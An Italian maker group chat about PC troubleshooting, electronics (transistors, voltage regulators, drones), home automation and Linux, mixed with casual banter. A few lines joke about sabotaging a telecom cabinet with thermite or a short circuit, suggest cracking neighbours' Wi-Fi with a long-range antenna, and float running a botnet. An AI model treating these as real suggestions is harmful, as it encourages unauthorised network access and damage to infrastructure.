Quella non la approvo
ragazzi mi aiutate è molto urgente?: allora, per collegare la scheda madre al monitor e  vedere da lì il desktop (ovviamente è moooolto temporanea la cosa) basta il cavo o bidogna mettere qualcosa in qualche impostazione?
aiutatemi sono un po' nella merda
Non lo seguo come youtuber
tanto quelle durano una vita..in caso chiedi pure

Windows 10?
si
dovrebbe prenderlo in automatico, altrimenti devi attivare il multischermo nelle Impostazioni
Malissimo
Upp
Ti perdono solo perché segui overVolt
nelle impostazioni dell ctrl alt canc lo trovo il multischermo?
Marco ogni tanto se ne esce con gente a caso
scusa se non uso termini molto tecnici
Anche la mia ragazza è più grande, di 9 mesi

Però preferisco quella di mikeshowsha fra le due
Chi è che segui tu, rifondazione comunista e basta 

Ma taci
Ho di meglio da fare che idolatrare gente che fa video 
no, devi andare nella nuova app Impostazioni, quella che ha sostituito il Pannello di Controllo
ma nom ci posso andare
perchè non vedo lo schermo
Non basta attaccare il cavo video alla scheda madre e staccare fisicamente la scheda video?
🤔 ma il monitor lo hai già oppure devi comprarlo?
in un portatile con gpu integrata?
Io avevo capito che non gli funziona più la scheda video di un fisso e voleva collegare lo schermo alla scheda madre per utilizzare l'integrata
no, a quanto ho capito non gli funziona più il monitor del portatile
E poi vabbè
Raga io ho un uscita audio amplificata e vorrei farla diventare una periferica di input(sul mio pc) ma ho paura a collegarla appunto perché è amplificata cosa posso fare?
Uguale a mamma
Italiana a s.francisco?
italo americana..è vecchio sto video 
Ma siii ma lo ho visto ora
È crudele 
Se è amplificata per delle casse lo uccidi il PC cazzo
È quella del gugu?
Come posso fare io stavo pensando di scollegare il chip che amplifica ma meglio di no
comunque W10 al 99% lo rileva in automatico, vai tranquillo..se devi comprare il monitor magari prima prova a collegare il portatile ad una tv e vedi se la rileva automaticamente
in verità è una tv
 la recensione?
Sto ancora al pub
Tranquillo, puoi scrivere anche da lì 
prendi il cavo e prova allora
Mi serve calma per fare una review
Ahahahahahah
no ma non ho un portatile
è un fisso
C'è un'amica che canta in questo pub, quando torno a casa te la faccio
e non posso manco fare il ripristino con backup perchè mo dice impossibile
Sii
L'avevo visto parla meglio l'inglese di tanti altri
allora, fammi capire un attimo..devi collegare il fisso alla tv per visualizzare W10, giusto? basta collegarci un VGA o HDMI e dovrebbe andare automaticamente l'uscita, anche solamente per il bios..prova
L'amica?
trombamica
Sorry
Troppo avanti

allora in pratica sono abbastanza sicuro che ci sia un problema coi driver della gpu, windows mi fa loggare  e poi schermo nero, ma non è bloccato, è solo che non fa proprio vedere la roba che dovrebbe caricare la gpu, perciò volevo attaccare il video alla scheda madre e aggiornare i driver do merda da li
sto smattando perchè domani devo portare un lavoro a cui sto lavoramdo da giorni
Ma anche no
ah ok, ho capito..capita ogni tanto con i driver video di W10..hai la scheda video dedicata o integrata?
Nemmeno un pensierino?
peccato
Fai una foto al dietro del pc
Madonna mi cadi
dedicata
sennò non c era il problema no?
cioè dedicata nel senso che l ho comprata staccata?
Io ho un'idea migliore
dimmi
🤦‍♂️
Metti linux
O lancia il PC e bestemmia
Ah msi
esattamente..il processore che modello è?
Allora fai come ti ho detto prima
i7 6400k
Fatto i soldi?
lasciamo perde
🤔6400K? sicuro? o 6700K?
non sono sicuro adesso
Come non sei sicuro? Ahahahahah
Ma lo schermo dove lo connetti?
alla scheda video
no, più che altro il 6400K non esiste 
allora 6700
È come chiederti il nome e rispondere: "Luigi o marco"
🤦‍♂️
alla scheda video..c'è il DisplayPort collegato
Facile...non lo connetti
E non puoi collegarlo alla dvi qua?
Ahh korry mi sono dimenticato
cosa è il display port?
Non devi essere utile, ma rompiballe
è la scheda madre
non mi vede niente
sei sicuro sia versione K?
si
di quello sono sicuro
Almeno...
perchè se è così sei fottuto, non hai la vga integrata
Ahahahah
Lol
🤔neanche sul bios ti entra con l'attacco mobo?
attacco mobo?
Formattone tattico
scusa ma non sono così esperto
la DVI della scheda madre
no
di cosa? 
Abbiamo visto, tranquillo
C'è anche HDMI ho visto
non mi vede proprio nulla con la scheda madre
L'altro giorno sono stato nella base militare di Bari e stavano vende lo zaino tuo
non cambia, senza scheda video integrata nella scheda madre oppure nel processore si attacca comunque..gli serve una scheda video per forza
Lo avevano un sacco di persone
E io, da bravo figlio...ho comparto una cosa con cui non dovrei girare
perchè hai un processore K..non hai un altro fisso da sventrare per prendergli la scheda video in prestito? pure una GT 210 andrebbe bene
E l'olio per la mia Taurus
no
e è una cosa che dovrei fare in serata
il Mil-Tec?  spettacolo
E perché la scheda madre ha quelle porte? Perché ovviamente in quel socket ci sono procio con schede video integrate?
Ma che domanda è?! Ahahahahah
Si
Mi sa che ormai fai mattina
certo..il 6400 e le altre versioni non K
scusa quindi non ho capito, se attacco l hdmi alla scheda madre è normale che non succeda una sega?
eh nulla, reimposta pc mi sa
certo, il tuo processore non ha una scheda video integrata, dipende solamente dalla scheda video (l'MSi nel tuo caso) per l'uscita video sul monitor
eh si, è l'unica
2 orette le perde ad occhi chiusi se deve ripristinare
qualche "molla" sicuro
Ma quanto sei rassicurante?!
Hai salvato il progetto?
e tu il tuo l'hai portato?
Le toppe solo per l'esercito
Eh no  non è che mi portavo lo zaino al giuramento di mio padre 
lo so..ecco perchè bestemmio in turco quando mi dicono che non fanno backup esterni.. ed il primo è 
 e il suo lancio del portatile 
Che poi si sono fatte pagare, non ti credere
giuramento di? quale reparto?
Ahahahahahah
Finanza
Per me manco bastano, secondo me è proprio guasta la scheda
Dopo 3 mesi è tornato 
Che palle
Non poteva durare un po' di più?!
Tu porti fortuna ahahahah
🤔 ma quindi ha fatto il RAV a Bari?
Si
Ma venivano da tutta Italia
Poi per un momento è stato pure commuovente
Perché durante i tre mesi è morto uno di 40anni con due figli mentre stavano mangiando
vabbè quello è ovvio..quindi adesso è effettivo GDF
Lo era pure prima 
gesù
Solo che con un grado in più
Eh
ah ok, passaggio di grado e consegne nuove capito
Praticamente quando andrà in pensione sarà maresciallo
sì se è guasta la scheda si fa un collettone e me la ricomprate
La parte più bella? Giravano tutti con la Beretta 
Poi alcuni anche con il fucile Beretta
Però tutti con la pistola
La 9mm
A colpo singolo
 io in quello della Marina ero con il MAB, il mitra Beretta
e in quello VVF con la piccozza
È proprio figo
Questo mai sentito
Mi sono letto il manuale suo del militare
non lo fanno più, adesso solamente divisa e cintura con ganci
In poche parole adesso smonto la mia pistola, la pulisco e la rimonto
Una volta mio padre mi fece prendere in mano la Beretta, feci per caricarla e mi rimase la pelle incastrata
Vicino al cane
Tu non immagini le bestemmie
Mi ricordo solo tanto dolore e mia madre che urlava dicendo di venire a tavola
oddio
I giorni felici
vedi? qua si vede bene l'ascia-piccozza
Io vedo solo tanta panza 
Ma tanta
quelli sono effettivi..caschi argento sono i funzionari, i caschi rossi capireparto e capisquadra
gli allievi Vigili sono i caschi neri
Unici in forma
a Capannelle sono tutti così, sono istruttori..tutti ca panzetta
Comunque non si possono vedere
Okay che hai una certa età
O che fai lavori d'ufficio
Ma seriamente
Tipo i colleghi di mio padre sulla quarantina hanno certe panze che veramente fanno sumo
Non si possono guardare
Eh vabbè girati dall'altra
  
No a parte gli scherzi, è molto vero... Probabilmente sono persone abbastanza sportive da giovani e che per un motivo o per l'altro hanno smesso senza cambiare ad esempio alimentazione
Ahahahahah
In quel momento rappresenti lo stato oh
vero..gli istruttori sono tutti così (tranne gli speleologi, quelli sono stecchini anche a 60 anni)
Come minimo devi presentarti bene
Ma ci sono alcuni sempre parlando di forze dell'ordine che hanno bisogno dello scooter per l'inseguimento
vedessi mio suocero a 55 anni è ancora un armadio a 4 ante (solleva 150 kg di bilanciere e fa 30 trazioni ogni mattina, cose allucinanti)..lui fa l'istruttore di lotta greco-romana per il gruppo sportivo
cioè ragazzi, 30 trazioni non le fa neanche un 20enne superallenato che pesa 60 chili
La madonna
Rassicurante 
ti dico solamente che è 1.90 per 95 chili, 45 di piede e una mano che sembra una pala
Senza parlare Delle regole sulle armi e sui mezzi usati dalle forze dell'ordine eh
Su cui è meglio stendere un velo pietoso
Ahahahahahah
ex atleta olimpico Mosca 1980
Ah le cose cambiano
 vai a vedere la storia  della pagina insta di pio e Amedeo
era in squadra con Claudio Pollio 
Chi lo conosce 
Oro lotta libera Mosca'80 - G.S. Vigili del Fuoco..nel nostro ambiente è famoso
Oh stai parlando di Mosca'80...io sono 2000
oh io sono vecchio eh, 30 anni
Il bastoni lo compro io adesso o lo ordini da quel sito che usano i giovani d'oggi chiamati Amazon?
maledetti ciovani d'oggi..ai miei tempi Apecar e cantiere
Atesso solo sesso dorga e pastorizia

Ahhh ai miei tempi
Mica le 2004 di oggi
Noi avevamo le '84 
comunque io vado a nanna  buonanotte
Notte

Chi è che verrà alla robocup a roma?
ok grazie
Sperem... Vabbè che con il portafusibili si riempie il foro passante sia con lo stagno sia con il piedino del portafusibili cosí tiene di piú

Dall' immagine monti un portafusibile 5 x 20 
Trovi fusibili di valori 10 15 20 A
Tranquillizzati vedendo la sezione dell' elemento fusibile nel vetro.
nup
Per favore, smettetela di provarci con me in chat privata, 
ma spiegami cosa ti cambia... non ha minimamente senso, non hai nessun tipo di informazione che possa essere rubata lì.
Mica ti salvano in un database quante righe del testo hai letto
questa spiegamela 
Non voglio far sapere alle persone che sito visito
Basta installarsi un server in lan
Senza internet
ma ci sei? 
Siamo nel 2018
Non nell’età della pietra
?
e se fosse http non lo vede comunque nessuno... manco fosse pornhub, é un blog quello 
ma é inutile, se é in lan significa che i computer sono fisicamente vicini, quindi parli a voce
non penso tu ti metta ad usare teamspeak per parlare da una stanza all'altra
Perché no? Che fai urli magari in una casa a 2 piani?
And that's why you don't use C++ for anything security related... (old pic, but I haven't seen it here yet)



by 
 ecco come creare un robot ammazza-persone
beh effettivamente 
In un ufficio di 1000 persone?
 
C'è qualcosa che mi dovete dire? 🤔
cos 
Io lo prenderei come complimento
Ma come fa a diventare true è impossibile
c'è solo un = quando dovrebbero essercene due == nell'if
Era una battuta
Nah, LFS è per masochisti
ah 
Che poi non si sa cosa poteva esserci dentro be_nice_to
Magari c'era la modalità vendetta ahhaha

Sono paranoica
PornHub utilizza nginx con certificato SSL, quindi sssh
E lo so perché stavo spulciando con curl in giro
Ma una cosa del genere funziona in tutti i linguaggi? In python va?
HAHAAHAHAHAHAHAHAHA
eh sì 
Skynet è vicina
Lol

Ma devo farla professionale?
Il prodotto è di ottima fattura, confrontate con altre cuffie potrebbero sembrare pesanti ma in un paio di giorni ci si abitua. La gomma che appoggia sull'orecchio è molto morbida e dopo averci fatto l'abitudine non da il minimo fastidio, l'unica pecca è che se fa molto caldo ti potrebbero sudare le orecchie, ma visto che sono cuffie chiuse è normale.
Per quanto riguarda l'isolamento, è passivo ma isola abbastanza bene, abbassando il volume riesci a sentire i rumori ambientali e le voci, ma il suono non perde dettagli.
Per quanto riguarda il suono, niente da dire, suono ben bilanciato, i bassi ci sono (18Hz-20kHz) e sono molto buoni (non sono cuffie con i bassi pompati, sono bilanciati con le altre frequenze); i medi hanno un'ottima dinamica, me ne sono innamorato subito, gli alti sono ben dettagliati.

Minchia 
 potrei aprire un canale di recensioni
Infatti avrei dovuto dire di essere maschio, mi scrivono in privata
HAHAHAHAHAAHAHHAHAAHAHAHAH
Per tutti quelli che mi hanno scritto, a me piacciono le ragazze
Fai trapelare altre cose?
Almeno tutti i maschi arrapati che mi scrivono, la smettono
Davvero ti hanno scritto?
Anche mandato foto
Rimorchio 4.0, quando alla fine becchi sempre la sorpresa🤣
🤦‍♂
Domani mattina faccio un salto a vedere le finali di Robocup qua a Trento, ci vediamo lì 
ci sara anche un live nel internet? vorrei vedere
Ho fatto un po' di storie instagram
Esce vlog?
O non meritava xD
Buongiorno a tutti!
Nope, non ho portato da vloggare
🤣🤣🤣🤣🤣🤣🤣
Quanti MDF

Il 6700k, 7700k e 8700k la hanno tutti la integrata, solo la fascia Extreme su x99 e x299 e gli xeon consumer non la hanno 
Ahahahahahah grazie mille
 mandi una foto?
Almeno ho delle foto da aggiungere alla raccolta
Hai una raccolta "gente che ce prova?"
Ho una raccolta di foto di gente che ci prova
Se le googli per me il 70% sono false
Molte hanno la dedica
Yep
Sei un esperto di questa tecnica? No perché io non ci avevo pensato a quella dedica
Ho le foto più disparate
Sono troppo vecchio per fare queste cose, menomale, non sono mai finito in una raccolta ahhaha
XD
Chi 'cazzo' apprezzerebbe
Che poi, chi me lo dice che tu sia donna e che tu mi piaccia, manco hai scritto il nome ahahhah come si fa a provarci con una persona vista a caso in una chat
ma che cazz di discorsi
.-.
Vallo a dire a tutti quelli che mi scrivono ahaha
Java itfw 
ù.ù
Purtroppo quella meccanica con gli switch blue non è mia 
Mi stai tentando
Chi me la spiega
Polo
Il polo rosso e nero
Volkswagen polo oppure polo della batteria
Edda non spiegarla davvero
Eh che ne so
Magari davvero non l'avevi capita
Io vorrei solo sapere se la storia è vera o costruita
AHAHAHAHAHAHAHAHAHHAHAHHAHAHA
Grazie :D
Mi fido
Unità naturali über alles
concordo con il secondo
C'è anche il video di GreatScott
 vorrei mettere su un nodemcu lua il software originale dei sonoff (quello per far si che si interfacci con i server loro) . Dove lo posso trovare?
qualcuno?
È Closed Source, non puoi
Dite che è ancora decente la pasta salda? Saranno 10 anni minimo che è li
Ha la peggio ruggine attorno
Anche la mia
è ancora usabile?
credo di si
perfetto, tanto l'avrei usata comunque
 ma switchando è solo un software(solo del codice)  oppure è un server (tipo quelli di itead)
 avete ribloccato le gif?
Sono state sempre bloccate
Sono concessi solo gli sticker in maniera moderata
Qualcuno sa usare decentemente xenforo?
Quando hai un buco di spazio
Bbbeeeeelllllllo il moddato
yey
soprattuto quando ti scappa una wrenchata e ti si sfancula tutto
Ahaha
Server?
nop
modpack mio, mondo mio
 Ma il video uscirá entro oggi o uscirá domani?
Domenica
mi sembrava una sigaretta
Mancano 2 min di upload
Hacking?
Mi sono dovuto assentare per il pranzo di compleanno della nonna
Hai capito a Marco
Sempre a mangiare
Visto che ieri sera NON ho mangiato 6 costine e 16 ali di pollo al roadhouse... 
In poche parole stai all'ingrasso
Nah, solito regime alimentare che mi tiene quel chilo o due sopra la soglia del sottopeso 
o.O
Quanto accidenti sei alto? xD
Quanto accidenti è magro piuttosto
No ma dico, per mangiare così tanto e stare 2 kg sopra il sottopeso .-.
194
Eh brucia tutto, assimila tutto
È l'attività cerebrale
Poi appena arrivati ai 30 ritorna tutto in panza
Ah beh fosse per quella saresti peggio di Adinolfi
Ah si assolutamente, tutti i romboli
Menchia
Sono i led rgb
No ma non avete idea, marco non è capace di stare 5 minuti fermo
Nono modalità "magra incinta"... resti magro ma col tondo 
Eh era un "se fosse per l'attività cerebrale"

🤣
Ora crasha il modem
Ora arriva un ddos a YouTube
Da quale Petabyte
Trump sbaglia mira coi suoi missili
Ora scappa un missile a trump sul datacenter di yt
Lol
Raga, ma hanno i missili simpatici in America 
 questa volta non mi sei piaciuto
?
Il video
Ah
Troppo lungo e noioso
Nessuna prova
Solo discorsivo
Hanno fatto video migliori
Come quelli di web? 
Dura la metà di quelli
Ahahahahahah ma quelli alla fine sono utili
E più palloso di quelli credo sia difficile
State al terminale
Spiegate
Programmate
In questo invece niente
14 minuti a parlare...stop
ciao
sto caricando una batteria
pure io
bello parlare con voi, torno a storia e martin lutero
ciao
quella del mio telefono
buona fortuna
io quella da 11.1V per il drone, appena è carica la attacco al cablaggio per gli esc, devo vedere se le saldature sono venute bene
in realtà sono le saldature peggiori che io abbia mai fatto ma cribbio, adesso le nascondo sotto la termorestringente, chi vuoi che se ne accorga mai ù-ù
spero solo si carichi entro 99 ore, voglio testarlo
Come riciclare le strisce che non hai messo sul f450
ora vogliamo la foto completa della postazione però! PS: il diffusore d'aromi a liquido sopra il case non è per niente una buona idea
Quando lo accendo lo sposto ;) ma grazie per il consiglio :D , foto pre  led ;)
molto bella..com'è la nuova meccanica Sharkoon?
🤔ma il monitor piccolo è per la Play? vedo dei controller
con un braccio multiplo sarebbe perfetta..però non so se i tuoi monitor hanno l'attacco Vesa
Doppio monitor su PC, quello piccolo anche per ps4 :)
Ho già nel carrello braccio doppio e adattatore perché o miei monitor non hanno il vesa!
Ho preso quella con gli switch rossi, molto comoda, precisa, non troppo rumorosa e ha il poggiapolsi che è tanta roba!
raga chi puo aiutarmi in un codice c++?
 ottimo
Inoltre ho la next vicino casa, un negozio fornitissimo e che va forte anche online...49€ e portata a casa
Come si chiama quel sensore che ti dice quanto é piegato?
Sensore di flessione
Quanto costa più o meno?

Offerte da homotix2014 in Sensori-di-Flessione- | Negozi eBay


Sensore di Flessione da 55mm | eBay
Devo cambiare case...cable management scarso con questo
Ora mi spiegate perché a voi non si riempie mai il pc di polvere 
C'é modo di "farseli"?
Come si usa il giroscopio?
Aspirapolvere e aria compressa
Tutto funzionaaaa❤️ 

Ahahah
il mio è un deserto
pieno di polvere, ho rinunciato a pulirlo
Siamo in due 
 piuttosto lo lascio aperto così la polvere non si deposita troppo
Come faccio a fare una cosa wireless che però mi va anche fuori dal raggio di un antenna?
'n che zenzo?
Una connessione tipo via internet ma wireless
tipo il wifi?
Ahahah ragazzi, piantate l'aspirapolvere fisso sul case e date una bella spruzzata, ripetere 2 o 3 volte...ci vuole niente! Certo un bellissimo air flow bilanciato aiuta
Tipo metterci una sim che permette una connessione ad internet
Per cui posso comandarlo a distanza
Ma wireless
oppure prendi la scheda madre, la sbatti sul tavolo e rinunci al case, almeno non si deposita la polvere
a ok...tipo wifi ma con molto più raggio intendi
Più o meno
beh o usi i moduli da 433MHz che però non so esattamente che raggio coprano, in alternativa ti attacchi una parabolica alla scheda di rete del dispositivo che devi connettere e la punti verso il modem
Lo avevo messo sul plexy...troppa ansia xD
beh però senza case ammetto che è un trattore
Non posso fare tipo wifi ma che si collega ad internet con una sim
di quello non sono studiato, comunque credo sia fattibile ma complesso credo
Posso farlo connettere ad un wifi
Senza il cavo?
bohh
Secondo voi gira manjaro?
Debian lo scarico a 32 o 64?
secondo me ci gira solo xp xd
devi capire se xp è na faccina o il sistema operativo.... potrebbe essere anche lo spazio la  risposta
Distro leggera leggera... Manjaro lxde perché no?
Ma è da isola ecologica
Ma che
Che con 2gb di ram ci girava Windows 7
Siamo diventati troppo ossessionati dai requisiti minimi.. Butti via il superfluo e funziona. Ovvio che non regge le animazioni di kde (e nemmeno chrome probabilmente)...
Certo ma il web è peso ormai ed è inusabile, tempo è denaro
Conosco persone che hanno fatto di sta cosa una filosofia di vita... Usano tranquillamente computer con un paio di GB di ram quotidianamente
Io ci ho rinunciato con il mio netbook
Ho un fisso di 10 anni fa cmq che uso
Soprattutto è rumoroso, cavolo per quello lo odio
Si tratta comunque di perderci tanto tanto tempo per limare tutto ad esempio... Usare gentoo con tutto compilato apposta, per dire, che così non hai roba inutile
Addio gnome and Co, i3wm... Addio Chrome
È estremismo, ma ricordiamoci che 4gb di ram su un computer per uso normale non sono pochi... Oggi senti "ha solo 4gb di ram, ci fai poco o nulla"
Non so quanto possa valerne la pena, ok essere troppo per il consumismo, non ti sto dicendo di avere l'ultimo i9. Ma almeno 4gb di ram e un i5... O un x4 amd anche vecchiotto... È il minimo
Sisi esatto. Vai in un negozio e ti guardano male se vuoi un computer con 4gb di ram o un telefono con 3gb di ram
Il mio ne ha 2 di cell
Ecco esatto
Anche 8GB non sono tantissimi
Però purtroppo sta iniziando a subire dei rallentamenti, dovuti alle app sempre più pese
Dipende cosa vuoi fare, per carità eh  non sto dicendo che con 2gb fai render fotorealistico...
Se usi solo internet e qualche programmino ti bastano, quando hai chrome con Android Studio già iniziano a stare stretti
qualcuno doveva pur farlo notare .-.
sì, sono sempre state bloccate... non taggare admin a caso che ci arriva la notifica a tutti 
la risposta più informata del mondo 
metri ❤️
Un mini-grattacielo
Una giraffa
Come si usa?
come hai trovato un messaggio del 13 agosto? 
comunque, scrivi a 
 e fa tutto lui
Ho cercato 
 su "cerca" e mi ha trovato il messaggio 
Io ho il 128
Usti...hai ritrovato un messaggio di 10 mesi fa
Nice meme
Cos'è?
Modestamente
bho
Kek mi tocca spendere soldi
Sad
Ho fatto partire un motore tennendolo in mano male, mi si è attorcigliato sul braccio in mezzo secondo ed è esplosa la saldatura, domani la rifaccio
Comunque funziona ancora
inesistente direi, altro che scarso
esistono i filtri antipolvere e l'aria compressa :)
Finalmente vps!!
🤔manjaro non saprei, lubuntu e puppy linux ad occhi chiusi
Dipende che de metti a manjaro
Con KDE te lo sogni ovviamente
ciò che fa la differenza sono 2 cose: RAM ed SSD..io ho un i3 Sandy Bridge sul mio Asus, ma ha anche 10 GB di Ram (8 Sodimm e 2 saldata) ed un ottimo SSD, e vola letteralmente..riesco a tenere caricate anche 35 tab di Chrome
si certo, ovviamente ha 2 strade: un compilato oppure una distro minimal
Già.. E se al posto di chrome metto qualcosa di light e usi un paio di tab al massimo, anche 10GB di ram diventano esagerati
il problema è che Chrome è troppo comodo per la sua sincronizzazione tra dispositivi..per me avere 3 portatili, telefono, 2 tablet e il fisso dell'ufficio sincronizzati via web è troppo comodo
Già
Unico motivo per cui lo uso... Ho provato l'altro giorno Firefox quantum... Minchia che rapido
io mi trovavo bene anche con Opera..però onestamente sono tornato a Chrome perchè è troppo comodo, sincronizza in automatico tutto
però cavolo se è pesante
Va bene anche edge ahahha brutto da dire...
Cos'è sodimm? Edit... Ho capito ahah non sapevo il loro nome
Terribile... Anche se irrinunciabile... Ma per XP non esiste più nessun browser?
come no  internet Explorer
Io so solo che devo formattare il fisso... Il suo sistema operativo viagga con clonazioni e aggiornamenti dal 2009, passando da 7 a 8 a 8.1 e le varie versioni di 10 e da 5 anni clonato sul SSD... È diventato un groviera
backup e formattone e risolvi
Sarebbe da cambiare preventivamente ssd
che ssd hai? come sta a settori? basta fare un controllo con il suo software, oppure uno gratuito
Menomale i dati li ho su hdd però hanno 10 anni, e uno di un raid è rimasto orfano hahaha
Viaggia da 5 anni
🤔 io farei un backup e sistemerei quel raid per prima cosa
Non c'è più il raid si è rotto uno dei due hdd e ho lasciato solo l'altro
Spe spe spe
Stiamo parlando dei raid dei terroristi americani e francesi in Siria?
No del raid 0 del mio fisso che è imploso 5 anni fa
E ancora viaggia la stessa installazione clonata
Imploso o esploso su un presunto deposito di armi chimiche?
No avevo chiamato il mio amico russo che aveva chiamato il suo cuggino che aveva spostato la bombola del gas dal garage alla cantina
ciao
Messo messo
ciao a tutti?
Buonasera
che tipo di makers siete?
cioè che cosa realizzate?
Buonasera
Buonasera
Buonporno
cioe?
perchè porno?
qualcuno ha mai utilizzato motorola 68000
nope
niente...ok
Ragazzi aiutoo
Sul mio server ho installato apache, mo come faccio a rendere pubblico il sito?
Dal mio pc dice che non ho i permessi
Per farlo publico intanto intanto apri il modem e apri uja porta sia tcp che udp e la punti sull'ip locale del rasp e poi usi noip metti il nome che vuoi e il dominio che vuoi tra quelli che ci sono e gli metti la porta che hai aperto..orra non mi ricordo più il processo intero mi sembra fosse così
se copio manjaro sulla pendrive non và
se utilizzo etcher funziona?
Si
Comunque la serie di web non se la caga quasi nessuno, quindi faremo un episodio conclusivo e bom perché non ha senso continuare ad occupare un video del sabato che potrebbe essere dedicato ad altro
sad
Nuuuuh :c
Mi piaceva tanto quella serie
Nooo
MA QUANTO È FIGO STO STICKER
Questo lo conoscevo
IFTTT HA AGGIUNTO L'ITALIANO PER GOOGLE ASSISTANT, MI HANNO ASCOLTATO
Letteralmente
Finalmente
Almeno adesso posso mettere la URL get e comandare i sonoff
Comandi vocali in italianoooo 
dove li hai piazzati i Sonoff?
3 sonoff normali al posto dell’interruttore di 3 lampade 

1 sonoff touch da 3 per controllo luci, Led e retroilluminazione di camera mia
Comandi vocali in italianoooo 
 mi copia
.
  dov'è l'opzione "fallo con un vecchio cell inutilizzato"?
 se hai qualche spazio nella programmazione dei video, porta un video sul NodeMcu
Beh quello basta attaccarlo a un caricatore e impostare che non si spenga mai lo schermo quand'è in carica (o che Google senta "Ok Google" anche a schermo spento quand'è in carica)
Il progetto emozionante è fargli la casa  per avere un bel design
Certo che però Google home sa di shick...
Come si imposta con schermo spento?
Magari parlando anche di Deauther e di MicroPython
In teoria basta che lo metti da ogni schermata e gli dici di sbloccare anche lo schermo con la voce
Sennò installi caffeine e lo metti su infinito
vedi che devi fare anche quella di guida >_< con un bellissimo case in cartone ahahahh
ragazzi
ho un problemone con un oggetto mongo :(
come posso trasformare un oggetto di mongo in un array?
 da così
a 
a così?
Mi sa che questo non è il gruppo più adatto per parlare di un DBMS così specifico e poco conosciuto come MongoDB
Se vuoi ti posso passare dei gruppi inglesi
Devo passare da 9v a 5v che metodo mi consigliate? Devo alimentare un modulo ad ultrasuoni hc-sr04
Stabilizzatore di tensione
Del tipo?
Ragazzi sono normali dei valori del genere per un ssd plus della Sandisk? Non vorrei fosse difettoso 
Nooo 
No, ti consiglio quelli della Samsung
Mi sa che farò il reso allora
La serie di stabilizzatori 78xx
In questo caso 7805
Ho uno stabilizzatore lm2940t -8.0 non va bene?
Cerca su internet
7805 o il pin 5V di Arduino, se stai usando un Arduino
Ho fatto una applicazione qualcuno con windows la può provare
?
Se è un .exe nessuno si fiderà
In che linguaggio è?
Perché???
Beh
Manda il sorgente
Ok direi che lo facciamo col raspberry... Potrebbe stare in esecuzione sullo stesso Raspi dove c'è Switchando ma probabilmente userò un piccolo Pi Zero W, un guscio stampato in 3D e del tessuto per ricostruire proprio identico il bellissimo Google Home ☺️
potevi farlo anche prima 
non puoi, l'SDK nuovo non è supportato dal Pi Zero W, ha un limite di richieste giornaliere e ha solo l'inglese
basta taggarlo
Potrebbe essere un virus
Ciao, si può installare arch su sistema EFI????
Seguo
Ma certo
Si deve
Sisi, quello è un server windows che ho comprato su 
. Ci ho installato wamp server così ho già tutto installato, apache, mysql, phpmyadmin etc
Diciamo che apache blocca tutte le connessioni eccetto localhost
Cioè solo local host ha I permessi per accedere al sito
Vedi nelle configurazioni di wamp
PERCHÈ WINDOWS + APACHE
Ehhh
Mi serviva per altre cose Windows 
Conoscete un metodo per farvi installare la  fibra a casa sostituendo l'attuale doppino telefonico che non sia il legarsi con le catene in piazza e protestare per crimini contro l'umanità?
Pagando
Eh no
Fosse così avrei già la gigabit
Un'alternativa può essere sabotare la centralina che lo collega a 2km di distanza
Cosa uso?
Chiedi la password ai vicini....
Non ce l'hanno manco loro
Termite o semplicemente la mando in corto?
Compra un'antenna Wi-Fi e cracca quelle nei dintorni
La casa più vicina con la ftth è a 1.5km di distanza
Antenna molto grande....
Ragazzi quando vado a controllare l'aggiornamento firmware del mio telefono mi dice questo:



Cosa significa, e cosa posso fare io?
Fanno antenne così di Grande gittata?
Non so
Si
20km 
Ma in teoria anche il telefono deve raggiungere quelle distanze per inviare i pacchetti al modem no?
Help me
Raga sapete dove lo prendo a poco il raspberry pi zero w ?

Il case non mi serve
Allow VirtualHost local ip’s other than 

Oke
Prenditi una orange pi, 9.72€ comprese le spedizioni
Spara il link, ha il wifi vero ?
Comunque non so quanto sia vantaggioso hostare su Windows 10 con Minecraft e Firefox installati
come si usa un pn2222a?
Ouch
No vabbè minecraft non parte neanche
Era per vedere se potevo giocare in remoto a mc lol
Si
Google orange pi, poi scegli il modello che più ti aggrada
È una bella bestiolina sto server
Volendo ho un'altra vps in centos6
Ok thank you 
Sii 
il signor romboli non vuole rispondere 
hey, io qualche video in più su arduino lo farei, del tipo come usare la libreria 
 
oggi da mia nonna c'era mio zio che si stava liberando della sua vecchia attrezzatura da radioamatore, ho praticamente fatto la spesa
i nodemcu sono meglio di arduino
sono arduino+wifi
una specie di arduino nano e wifi
si ok, e arduino+crt vuoi dirmi che non è una strafigata?
 watch this
è tutto strafigo
lo so
Comunque un suggerimento a Marco vorrei dare
Quando fà un tutorial non deve fermarsi lì, ma andare oltre e fare tutti quei progetti DIY fighissimi
Ragazzi ma perché non mi va sulla pagina di swichando
Ragazzi, dite che se installo un honeypot in un server centos posso installarci una botnet? (a fin di bene)
A mò di Mr robot
Mi spiegate come funziona questo transistor?
è un pn2222a, basta che cerchi un datasheet
Non so leggerlo
minchia, è inglese, cosa c'è che devi sapere
è un npn, pin 1 emittente, pin 2 base e pin 3 collettore vedendolo con la faccia piatta verso di te
Non funziona però
Sto provando a mandarlo a ritmo di musica
Al centrale ho collegato i due canali insieme
La massa a sinistra
E un relè a destra
di solito si usa un tip31 per quello, comunque prova a vedere se funziona, testalo
Non va
Su 
 ho messo all granted ma continua a darmi errore
cosa
se è rotto è rotto
Ne ho provati 2
Volendo ne provo uno nuovo
Mi potresti dire i collegamenti così non brucio nemmeno quello?
a boh, non so che tu stia tentando di fare, comunque finchè non fai ponti tra le zampe del transistor e non superi il suo voltaggio di funzionamento non dovresti fare danni
Vorrei mandare un led a ritmo di musica
e per superare il suo voltaggio di funzionamento ce ne vuole...beh non dargli più di 15V per sicurezza
fai direttamente su base il segnale musicale, su collettore la corrente, essendo un led dagli quel poco che serve, tipo 2v, e su emittente il positivo del led
credo andrebbe
anche se boh, non sono molto studiato a riguardo io
Hai riavviato?
Comunque come ho fatto funzionava
Però siccome era un relè non si accendeva
Provato sia la 5v e il gnd
Ora ho messo un led e faccio passare il gnd e si accende, pianissimo però
Dovrei tipo amplificare il segnale
Yep
Che figata La Casa de Papel 
Carica telefono con alimentatore switching si può fare? O rischia di danneggiare il telefono?
Dovrebbero fare le giornate da 24h+3h per Netflix, 24h non possono bastare 
Mmmh sono un po' complicati i caricatelefono, caricano a velocità diverse in base a... cose, a quanto so
Che voi sappiate c++ può usare i get?
In modo umano
Altrimenti mi converto al javismo
Penso che tu debba aprire un socket presso un indirizzo e mandare una richiesta HTTP scritta a mano ben formattata
Piuttosto ripiega su python, evita java
Ci sta
Anche python mi attizza
Comunque come ha detto emanuele, su c++ devi aprire un sochet e fare una richiesta http
